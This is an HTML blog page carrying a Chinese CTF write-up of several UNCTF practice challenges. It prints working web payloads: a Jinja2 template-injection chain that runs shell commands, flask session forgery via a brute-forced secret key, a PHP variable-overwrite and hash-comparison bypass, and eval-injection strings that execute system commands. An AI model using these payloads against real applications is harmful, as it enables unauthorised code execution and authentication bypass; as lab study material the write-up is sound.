@@ -1,0 +1,801 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="-web -write up -ctf," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="mrl64's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="前言 继续刷，还有一些web没解决">
+<meta property="og:type" content="article">
+<meta property="og:title" content="unctf练习2">
+<meta property="og:url" content="http://example.com/2022/03/16/unctf%E7%BB%83%E4%B9%A02/index.html">
+<meta property="og:site_name" content="mrl64&#39;s Blog">
+<meta property="og:description" content="前言 继续刷，还有一些web没解决">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-03-16T13:27:23.000Z">
+<meta property="article:modified_time" content="2022-03-17T09:38:22.387Z">
+<meta property="article:author" content="liszt_lin">
+<meta property="article:tag" content="-web -write up -ctf">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2022/03/16/unctf练习2/"/>
+
+
+
+
+
+  <title>unctf练习2 | mrl64's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">mrl64's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/16/unctf%E7%BB%83%E4%B9%A02/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mrl64's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">unctf练习2</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-03-16T21:27:23+08:00">
+                2022-03-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
+<p>继续刷，还有一些web没解决</p>
+</blockquote>
+<span id="more"></span>
+
+<h1 id="easyflask"><a href="#easyflask" class="headerlink" title="easyflask"></a>easyflask</h1><p>进入网页后让我们登录admin，但是啥都没有，这里扫描器应该是可以扫出来的，但是我直接猜路由猜出来了……</p>
+<p><code>/login</code>路由登录，<code>register</code>路由注册，那么我们先注册一个admin再登录。</p>
+<p>好像是环境问题，复现的时候页面不会跳转，应该会有个<code>/secret_route_you_do_not_know</code>路由，这个路由存在ssti，fuzz发现<code>&#39;%&#39;, &#39;_&#39;, &#39;eval&#39;, &#39;open&#39;, &#39;flag&#39;,in, &#39;-&#39;, &#39;class&#39;, &#39;mro&#39;, &#39;[&#39;, &#39;]&#39;, &#39;\&quot;&#39;, &#39;\&#39;&#39;</code>被过滤，因此使用attr和request.header.xn代替黑名单，取出eval执行，绕过下划线与引号，payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?guess=&#123;&#123;()|attr(request.args.class)|attr(request.args.bases)|attr(request.args.subclasses)()|attr(request.args.a)(117)|attr(request.args.b)|attr(request.args.c)|attr(request.args.d)(request.args.e)(request.args.f)|attr(request.args.g)()&#125;&#125;&amp;class=__class__&amp;bases=__base__&amp;subclasses=__subclasses__&amp;a=__getitem__&amp;b=__init__&amp;c=__globals__&amp;d=get&amp;e=popen&amp;f=cat flag.txt&amp;g=read</span><br></pre></td></tr></table></figure>
+
+<p>传入获取flag</p>
+<p>后来发现这题还有考flask session的伪造，应该是出题人数据库没弄好导致非预期了，先看session：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ1c2VybmFtZSI6Im1ybDY0In0.YjHmyg.GRqDKK3KExT0DN_Db_TYKi7Rf8g</span><br></pre></td></tr></table></figure>
+
+<p>这个和token是类似的东西，这里我们需要爆破出来secret_key，参考下面这篇博客：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_41790086/article/details/107554397">通过SECRET_KEY绕过flask的session认证</a></p>
+<p>使用flask_unsign工具爆破出secret_key的值，然后伪造session绕过验证，从而登录admin。</p>
+<h1 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h1><p>一点都不ez的php审计，审计代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">$adminPassword = &#x27;d8b8caf4df69a81f2815pbcb74cd73ab&#x27;;</span><br><span class="line">if (!function_exists(&#x27;fuxkSQL&#x27;)) &#123;</span><br><span class="line">    function fuxkSQL($iText)</span><br><span class="line">    &#123;</span><br><span class="line">        $oText = $iText;</span><br><span class="line">        $oText = str_replace(&#x27;\\\\&#x27;, &#x27;\\&#x27;, $oText);</span><br><span class="line">        $oText = str_replace(&#x27;\&quot;&#x27;, &#x27;&quot;&#x27;, $oText);</span><br><span class="line">        $oText = str_replace(&quot;\&#x27;&quot;, &quot;&#x27;&quot;, $oText);</span><br><span class="line">        $oText = str_replace(&quot;&#x27;&quot;, &quot;&#x27;&#x27;&quot;, $oText);</span><br><span class="line">        return $oText;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if (!function_exists(&#x27;getVars&#x27;)) &#123;</span><br><span class="line">    function getVars()</span><br><span class="line">    &#123;</span><br><span class="line">        $totals = array_merge($_GET, $_POST);</span><br><span class="line">        if (count($_GET)) &#123;</span><br><span class="line">            foreach ($_GET as $key =&gt; $value) &#123;</span><br><span class="line">                global $&#123;$key&#125;;</span><br><span class="line">                if (is_array($value)) &#123;</span><br><span class="line">                    $temp_array = array();</span><br><span class="line">                    foreach ($value as $key2 =&gt; $value2) &#123;</span><br><span class="line">                        if (function_exists(&#x27;mysql_real_escape_string&#x27;)) &#123;</span><br><span class="line">                            $temp_array[$key2] = fuxkSQL(trim($value2));</span><br><span class="line">                        &#125; else &#123;</span><br><span class="line">                            $temp_array[$key2] = str_replace(&#x27;&quot;&#x27;, &#x27;\&quot;&#x27;, str_replace(&quot;&#x27;&quot;, &quot;\&#x27;&quot;, (trim($value2))));</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $&#123;$key&#125; = $_GET[$key] = $temp_array;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    if (function_exists(&#x27;mysql_real_escape_string&#x27;)) &#123;</span><br><span class="line">                        $&#123;$key&#125; = fuxkSQL(trim($value));</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        $&#123;$key&#125; = $_GET[$key] = str_replace(&#x27;&quot;&#x27;, &#x27;\&quot;&#x27;, str_replace(&quot;&#x27;&quot;, &quot;\&#x27;&quot;, (trim($value))));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">getVars();</span><br><span class="line">if (isset($source)) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//只有admin才能设置环境变量</span><br><span class="line">if (md5($password) === $adminPassword &amp;&amp; sha1($verif) == $verif) &#123;</span><br><span class="line">    echo &#x27;you can set config variables!!&#x27; . &#x27;&lt;/br&gt;&#x27;;</span><br><span class="line">    foreach (array_keys($GLOBALS) as $key) &#123;</span><br><span class="line">        if (preg_match(&#x27;/var\d&#123;1,2&#125;/&#x27;, $key) &amp;&amp; strlen($GLOBALS[$key]) &lt; 12) &#123;</span><br><span class="line">            @eval(&quot;\$$key&quot; . &#x27;=&quot;&#x27; . $GLOBALS[$key] . &#x27;&quot;;&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    foreach (array_keys($GLOBALS) as $key) &#123;</span><br><span class="line">        if (preg_match(&#x27;/var\d&#123;1,2&#125;/&#x27;, $key)) &#123;</span><br><span class="line">            echo ($GLOBALS[$key]) . &#x27;&lt;/br&gt;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>直接先看主要部分，我们发现第一个匹配<code>md5($password) === $adminPassword</code>，但是那个$adminPassword根本就不是md5，因此我们要寻找一下可以利用的点。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">foreach ($_GET as $key =&gt; $value) &#123;</span><br><span class="line">    global $&#123;$key&#125;;</span><br></pre></td></tr></table></figure>
+<p>这个地方有一个变量覆盖，我们如果传入<code>adminPassword=c4ca4238a0b923820dcc509a6f75849b</code>的话就可以覆盖掉原题目中的这个变量，那么这个密码的md5就变成可控的了。</p>
+<p>然后是sha1碰撞，弱类型比较直接找老朋友0e就可以了，因此这里的payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?source&amp;password=1&amp;adminPassword=c4ca4238a0b923820dcc509a6f75849b&amp;verif=0e1290633704</span><br></pre></td></tr></table></figure>
+
+<p>继续看，要我们传入一个名称为var1或者var2的值，并且值的长度要小于12。这里有几种方法都能解决问题，php复杂，语句闭合等等都可以构造出rce，payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?source&amp;password=1&amp;adminPassword=c4ca4238a0b923820dcc509a6f75849b&amp;verif=0e1290633704&amp;var1=\&quot;;$a();?&gt;&amp;a=phpinfo</span><br><span class="line">//语句闭合</span><br><span class="line"></span><br><span class="line">?source&amp;password=1&amp;adminPassword=c4ca4238a0b923820dcc509a6f75849b&amp;verif=0e1290633704&amp;var1=$&#123;$a()&#125;&amp;a=phpinfo</span><br><span class="line">//php复杂</span><br></pre></td></tr></table></figure>
+
+<h1 id="phpmysql"><a href="#phpmysql" class="headerlink" title="phpmysql"></a>phpmysql</h1><p>这题还是复习下吧，审计代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">echo(&quot;欢迎来到unctf2021，have fun&quot;.&quot;&lt;br&gt;&quot;);</span><br><span class="line"></span><br><span class="line">$db_host=$_POST[&#x27;host&#x27;];</span><br><span class="line">$db_user=$_POST[&#x27;user&#x27;];</span><br><span class="line">$db_pwd=$_POST[&#x27;pwd&#x27;];</span><br><span class="line">$db_port=$_POST[&#x27;port&#x27;];</span><br><span class="line"></span><br><span class="line">if($db_host==&quot;&quot;)&#123;</span><br><span class="line">    die(&quot;数据库地址不能为空！&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(is_numeric($db_host))&#123;</span><br><span class="line">    echo(&quot;fakeflag is /flag&quot;.&quot;&lt;br&gt;&quot;);</span><br><span class="line">    if(preg_match(&quot;/;|\||&amp;/is&quot;,$db_user) || preg_match(&quot;/;|\||&amp;/is&quot;,$db_pwd) || preg_match(&quot;/;|\||&amp;/is&quot;,$db_port))&#123;</span><br><span class="line">        die(&quot;嘉然今天吃什么&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    system(&quot;mysql -h $db_host -u $db_user -p $db_pwd -P $db_port --enable-local-infile&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo(&quot;Maybe you can do someting else&quot;.&quot;&lt;br&gt;&quot;);</span><br><span class="line">    if(!isset($db_user) || !isset($db_pwd))&#123;</span><br><span class="line">        eval(&quot;echo new Exception(\&quot;&lt;script&gt;alert(&#x27;关注嘉然，顿顿解馋！！！&#x27;);&lt;/script&gt;\&quot;);&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        $db_user = str_ireplace(&quot;SplFileObject&quot;, &quot;UNCTF2021&quot;, $db_user);</span><br><span class="line">        eval(&quot;echo new $db_user($db_pwd);&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>我们首先要定位到我们需要的rce上，这里能利用的应该是最后一句，因此我们就要对user与pwd大做文章。这里用语句闭合的方法，首先host是必须要的，随便输入一个非数字就可以了。接着是payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">host=a&amp;user=DirectoryIterator&amp;pwd=&quot;/&quot;);system(&quot;ls /&quot;);echo (&quot;1&quot;</span><br></pre></td></tr></table></figure>
+
+<p>利用DirectoryIterator使语句成立，并且配合pwd闭合语句，这样eval中就变成了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(&quot;echo new DirectoryIterator(&quot;/&quot;);system(&quot;ls /&quot;);echo (&quot;1&quot;);&quot;); </span><br></pre></td></tr></table></figure>
+<p>构造rce成功。</p>
+<p>后来发现这题还有一种解法，异常报错执行rce：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">host=a&amp;user=exception&amp;pwd=system(&quot;ls /&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>具体原理可以参考下面这篇博客：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38154820/article/details/120793296">连异常报错也能拿到flag?</a></p>
+<h1 id="俄罗斯方块人大战奥特曼"><a href="#俄罗斯方块人大战奥特曼" class="headerlink" title="俄罗斯方块人大战奥特曼"></a>俄罗斯方块人大战奥特曼</h1><p>游戏关，找js，发现这样一串：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">const go = new Go();</span><br><span class="line">const name =&quot;blocks&quot;;</span><br><span class="line">const curWwwPath=window.document.location.href;</span><br><span class="line">const pathName=window.document.location.pathname;</span><br><span class="line">const pos=curWwwPath.indexOf(pathName);</span><br><span class="line">const localhostPath=curWwwPath.substring(0,pos);</span><br><span class="line">let url = `$&#123;localhostPath&#125;/$&#123;name&#125;.wasm.gz`;</span><br></pre></td></tr></table></figure>
+
+<p>发现存在wasm包，下载，打开后搜索flag，找到html文档，进入文档即可获取flag。</p>
+<p>这题好水，就是说给游戏关的js寻找提供了一种思路吧。</p>
+<h1 id="EZ-IMAGE-misc"><a href="#EZ-IMAGE-misc" class="headerlink" title="EZ_IMAGE(misc)"></a>EZ_IMAGE(misc)</h1><p>最后记一道拼图题，这题用到了两个工具：montage和gaps</p>
+<p>下载附件后发现拿到的都是名字以unctf开头的图片，总共225张，用montage把图片整合：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">montage unctf*.jpg -tile 15x15 -geometry 60x60+0+0 test.jpg</span><br></pre></td></tr></table></figure>
+
+<p>接着用gaps工具进行拼图使图片复原：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gaps --image=test.jpg --generation=30 --population=300 --size=60</span><br></pre></td></tr></table></figure>
+
+<p>获得flag。这两个工具对于拼图处理有很强大的作用，可以说又收集到新工具了。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web-write-up-ctf/" rel="tag"># -web -write up -ctf</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/03/14/unctf%E7%BB%83%E4%B9%A01/" rel="next" title="unctf练习1">
+                <i class="fa fa-chevron-left"></i> unctf练习1
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">56</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">25</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#easyflask"><span class="nav-number"></span> <span class="nav-text">easyflask</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#easyphp"><span class="nav-number"></span> <span class="nav-text">easyphp</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#phpmysql"><span class="nav-number"></span> <span class="nav-text">phpmysql</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%84%E7%BD%97%E6%96%AF%E6%96%B9%E5%9D%97%E4%BA%BA%E5%A4%A7%E6%88%98%E5%A5%A5%E7%89%B9%E6%9B%BC"><span class="nav-number"></span> <span class="nav-text">俄罗斯方块人大战奥特曼</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#EZ-IMAGE-misc"><span class="nav-number"></span> <span class="nav-text">EZ_IMAGE(misc)</span></a></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">liszt_lin</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
